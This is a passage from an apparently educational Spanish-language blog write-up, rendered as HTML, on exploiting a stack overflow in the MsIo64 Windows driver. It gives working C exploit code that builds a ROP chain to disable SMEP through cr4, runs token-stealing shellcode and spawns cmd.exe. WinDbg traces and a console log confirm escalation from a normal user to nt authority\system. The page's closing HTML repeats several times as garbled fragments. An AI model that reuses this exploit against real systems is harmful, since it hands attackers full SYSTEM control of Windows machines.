    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">MsIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 104</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 72</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">72</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x23a028</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="mi"> 0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> <<</span><span class="mi"> 20</span><span class="p">;  </span><span class="c1">// cr4 value
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x39f027</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">             // token stealing</span><span class="p">

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 104</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);

    CloseHandle(hDevice);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para comprobarlo volvemos a establecer un breakpoint en el <code class="language-plaintext highlighter-rouge">ret</code> y avanzamos hasta justo antes de mover el nuevo valor al registro <code class="language-plaintext highlighter-rouge">cr4</code> para verificar que funcione</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
MsIo64+0x16b9:
fffff806`559116b9 c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1c:
fffff806`5ec163ec 59              pop     rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1d:
fffff806`5ec163ed c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!KeFlushCurrentTbImmediately+0x17:
fffff806`5eda06a7 0f22e1          mov     cr4,rcx  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar <code class="language-plaintext highlighter-rouge">mov</code> modifica el valor de <code class="language-plaintext highlighter-rouge">cr4</code> cambiando el bit <code class="language-plaintext highlighter-rouge">20</code> a <code class="language-plaintext highlighter-rouge">0</code> y deshabilitando la protección <code class="language-plaintext highlighter-rouge">SMEP</code> asi pudiendo ejecutar asi el shellcode en el modo de usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000350ef8

</span><span class="ro">0: kd></span><span class="p"> p
00000214`36ea0000 65488b142588010000 mov   rdx,qword ptr gs:[188h]  

</span><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000250ef8

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Si simplemente continuamos la ejecución podemos ver que el exploit funciona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.20348.1006]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
78894953382991917"></script>

    </div>
  </body>
</html>
ml>
ktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
